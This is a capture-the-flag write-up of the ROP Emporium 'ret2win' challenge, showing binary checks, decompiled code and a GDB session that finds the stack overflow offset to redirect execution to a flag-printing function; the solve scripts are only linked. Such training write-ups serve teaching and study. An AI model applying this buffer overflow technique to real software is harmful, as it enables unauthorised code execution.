### Binary Exploitation

### Source: ROP Emporium

### Name: Ret2Win (x86 & x64)

### Basic File Check

```
┌──(venv)─(mark㉿haxor)-[~/…/Challs/RopEmperium/ret2win/32bits]
└─$ file ret2win
ret2win: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e1596c11f85b3ed0881193fe40783e1da685b851, not stripped
                                                                                                                                                                                            
┌──(venv)─(mark㉿haxor)-[~/…/Challs/RopEmperium/ret2win/32bits]
└─$ checksec ret2win
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/home/mark/Desktop/BofLearn/Challs/RopEmperium/ret2win/32bits/ret2win'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

Cool so we're working with a x86 binary and its protection is only NX enabled

I'll run to get a quick overview of what it does

```
┌──(venv)─(mark㉿haxor)-[~/…/Challs/RopEmperium/ret2win/32bits]
└─$ ./ret2win             
ret2win by ROP Emporium
x86

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> lol
Thank you!

Exiting
```

So it prints out some words then asks for input then exits after we give it input

Decompiling using ghidra i'll read the main function

```

undefined4 main(void)

{
  setvbuf(stdout,(char *)0x0,2,0);
  puts("ret2win by ROP Emporium");
  puts("x86\n");
  pwnme();
  puts("\nExiting");
  return 0;
}
```

So the main function calls the pwnme() function

Here's the decompiled pwnme function

```

void pwnme(void)

{
  undefined input [40];
  
  memset(input,0,0x20);
  puts(
      "For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffe r!"
      );
  puts("What could possibly go wrong?");
  puts(
      "You there, may I have your input please? And don\'t worry about null bytes, we\'re using read ()!\n"
      );
  printf("> ");
  read(0,input,0x38);
  puts("Thank you!");
  return;
}
```

So reading the code we get the vulnerability that is in it, it reads 0x38 bytes of data into a 40 bytes input buffer

With this we have 16 extra bytes which will cause an overflow

Looking through the code i get another function called `ret2win`

```
void ret2win(void)

{
  puts("Well done! Here\'s your flag:");
  system("/bin/cat flag.txt");
  return;
}
```

The function justs prints out the flag cool. So from this we know what we should overflow the buffer then return to the win function

Firstly i'll get the offset using gdb 

```
┌──(venv)─(mark㉿haxor)-[~/…/Challs/RopEmperium/ret2win/32bits]
└─$ gdb -q ret2win           
GEF for linux ready, type `gef' to start, `gef config' to configure
90 commands loaded and 5 functions added for GDB 12.1 in 0.01ms using Python engine 3.11
Reading symbols from ret2win...
(No debugging symbols found in ret2win)
gef➤  disass pwnme
Dump of assembler code for function pwnme:
   0x080485ad <+0>:     push   ebp
   0x080485ae <+1>:     mov    ebp,esp
   0x080485b0 <+3>:     sub    esp,0x28
   0x080485b3 <+6>:     sub    esp,0x4
   0x080485b6 <+9>:     push   0x20
   0x080485b8 <+11>:    push   0x0
   0x080485ba <+13>:    lea    eax,[ebp-0x28]
   0x080485bd <+16>:    push   eax
   0x080485be <+17>:    call   0x8048410 <memset@plt>
   0x080485c3 <+22>:    add    esp,0x10
   0x080485c6 <+25>:    sub    esp,0xc
   0x080485c9 <+28>:    push   0x8048708
   0x080485ce <+33>:    call   0x80483d0 <puts@plt>
   0x080485d3 <+38>:    add    esp,0x10
   0x080485d6 <+41>:    sub    esp,0xc
   0x080485d9 <+44>:    push   0x8048768
   0x080485de <+49>:    call   0x80483d0 <puts@plt>
   0x080485e3 <+54>:    add    esp,0x10
   0x080485e6 <+57>:    sub    esp,0xc
   0x080485e9 <+60>:    push   0x8048788
   0x080485ee <+65>:    call   0x80483d0 <puts@plt>
   0x080485f3 <+70>:    add    esp,0x10
   0x080485f6 <+73>:    sub    esp,0xc
   0x080485f9 <+76>:    push   0x80487e8
   0x080485fe <+81>:    call   0x80483c0 <printf@plt>
   0x08048603 <+86>:    add    esp,0x10
   0x08048606 <+89>:    sub    esp,0x4
   0x08048609 <+92>:    push   0x38
   0x0804860b <+94>:    lea    eax,[ebp-0x28]
   0x0804860e <+97>:    push   eax
   0x0804860f <+98>:    push   0x0
   0x08048611 <+100>:   call   0x80483b0 <read@plt>
   0x08048616 <+105>:   add    esp,0x10
   0x08048619 <+108>:   sub    esp,0xc
   0x0804861c <+111>:   push   0x80487eb
   0x08048621 <+116>:   call   0x80483d0 <puts@plt>
   0x08048626 <+121>:   add    esp,0x10
   0x08048629 <+124>:   nop
   0x0804862a <+125>:   leave  
   0x0804862b <+126>:   ret    
End of assembler dump.
gef➤  b *0x0804862a
Breakpoint 1 at 0x804862a
gef➤ 
```

Now i'll run it

```
gef➤  r
Starting program: /home/mark/Desktop/BofLearn/Challs/RopEmperium/ret2win/32bits/ret2win 
[*] Failed to find objfile or not a valid file format: [Errno 2] No such file or directory: 'system-supplied DSO at 0xf7ef1000'
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
ret2win by ROP Emporium
x86

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> 1234567890
Thank you!

Breakpoint 1, 0x0804862a in pwnme ()

[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xb       
$ebx   : 0xf7e1cff4  →  0x0021cd8c
$ecx   : 0xf7e1e9b8  →  0x00000000
$edx   : 0x1       
$esp   : 0xffbee6c0  →  "1234567890\n"
$ebp   : 0xffbee6e8  →  0xffbee6f8  →  0x00000000
$esi   : 0x8048660  →  <__libc_csu_init+0> push ebp
$edi   : 0xf7f26b80  →  0x00000000
$eip   : 0x804862a  →  <pwnme+125> leave 
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffbee6c0│+0x0000: "1234567890\n"       ← $esp
0xffbee6c4│+0x0004: "567890\n"
0xffbee6c8│+0x0008: "90\n"
0xffbee6cc│+0x000c: 0x00000000
0xffbee6d0│+0x0010: 0x00000000
0xffbee6d4│+0x0014: 0x00000000
0xffbee6d8│+0x0018: 0x00000000
0xffbee6dc│+0x001c: 0x00000000
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x8048621 <pwnme+116>      call   0x80483d0 <puts@plt>
    0x8048626 <pwnme+121>      add    esp, 0x10
    0x8048629 <pwnme+124>      nop    
 →  0x804862a <pwnme+125>      leave  
    0x804862b <pwnme+126>      ret    
    0x804862c <ret2win+0>      push   ebp
    0x804862d <ret2win+1>      mov    ebp, esp
    0x804862f <ret2win+3>      sub    esp, 0x8
    0x8048632 <ret2win+6>      sub    esp, 0xc
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "ret2win", stopped 0x804862a in pwnme (), reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x804862a → pwnme()
[#1] 0x8048590 → main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  search-pattern 1234567890
[+] Searching '1234567890' in memory
[+] In '[stack]'(0xffbd0000-0xffbf1000), permission=rw-
  0xffbee6c0 - 0xffbee6cc  →   "1234567890\n" 
gef➤  i f
Stack level 0, frame at 0xffbee6f0:
 eip = 0x804862a in pwnme; saved eip = 0x8048590
 called by frame at 0xffbee710
 Arglist at 0xffbee6e8, args: 
 Locals at 0xffbee6e8, Previous frame's sp is 0xffbee6f0
 Saved registers:
  ebp at 0xffbee6e8, eip at 0xffbee6ec
gef➤ 
```

Doing the math i get the offset `0xffbee6ec - 0xffbee6c0 = 0x2c`

I can make the exploit now using pwntools 

Here's my solve script [Exploit](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/ret2win/exploit32.py)

On running it, it works

```
└─$ python3 exploit.py
[+] Starting local process './ret2win': pid 107638
[+] ROPE{a_placeholder_32byte_flag!}
[*] Process './ret2win' stopped with exit code -11 (SIGSEGV) (pid 107638)
```

Here's the solve script for the x64 binary [Exploit](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/ret2win/exploit64.py)

And we're done

<br> <br> 
[Back To Home](../../index.md)
